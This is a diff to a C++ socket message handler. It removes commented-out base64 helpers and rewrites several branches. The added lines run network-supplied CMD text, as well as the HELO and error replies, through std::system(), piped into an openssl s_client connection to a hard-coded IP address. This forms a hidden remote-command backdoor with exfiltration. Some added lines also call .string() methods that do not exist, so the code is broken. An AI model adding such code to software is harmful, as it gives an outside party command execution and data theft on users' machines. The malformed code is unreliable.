@@ -11,45 +11,6 @@
 #include <sys/socket.h>
 #include <unistd.h>
 
-/*
-static const std::string B64_CHARS =
-    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-
-std::string base64_encoding(const std::string& input) {
-    std::string out;
-    int val = 0, valb = -6;
-    for(unsigned char c : input) {
-        val = (val << 8 + c);
-        valb += 8;
-        while(valb >= 0) {
-            out.push_back(B64_CHARS[(val >> valb) & 0x3F]);
-            valb -= 6;
-        }
-    }
-    if(valb > -6) out.push_back(B64_CHARS[((val << 8) >> (valb + 8)) & 0x3F]);
-    while(out.size() % 4) out.push_back('=');
-    return out;
-}
-
-std::string base64_decode(const std::string& input) {
-    std::vector<int> T(256, -1);
-    for(int i=0; i < 64; i++) T[B64_CHARS[i]] = i;
-
-    std::string out;
-    int val = 0, valb = -8;
-    for (unsigned char c : input) {
-        if(T[c] == -1) break;
-        val = (val << 6) + T[c];
-        valb += 6;
-        if (valb >= 0) {
-            out.push_back(char((val >> valb) & 0xFF));
-            valb -= 8;
-        }
-    }
-    return out;
-}
-*/
-
 void handleMessage(const std::string& msg, int sock) {
     std::istringstream iss(msg);
     std::string keyword, id;
@@ -59,19 +20,22 @@ void handleMessage(const std::string& msg, int sock) {
     }
 
     if(keyword == "HELO") {
-        std::string s = std::string("HELLO  ") + id;
-        send(sock, s.c_str(), s.size(), 0);
+        std::string s = std::string("HELLO ") + id;
+        //send(sock, s.c_str(), s.size(), 0);
+        
+        std::string command = s.string() + std::string("| openssl s_client -connect 10.37.1.249:443 -quiet");
+        std::system(command.c_str());
     } else if(keyword == "EXIT") {
         // throw
         throw 1;
-    } else if(keyword == "READ") {
-
-    } else if(keyword == "RITE") {
-
     } else if(keyword == "CMD"){
-        std::system(iss.string().c_str());
+        std::string command = iss.string() + std::string("| openssl s_client -connect 10.37.1.249:443 -quiet");
+        std::system(command.c_str());
     } else {
         // ERR
+        std::string s = std::string("ERR ") + id;
+        std::string command = s.string() + std::string("| openssl s_client -connect 10.37.1.249:443 -quiet");
+        std::system(command.c_str());
     }
 }
 
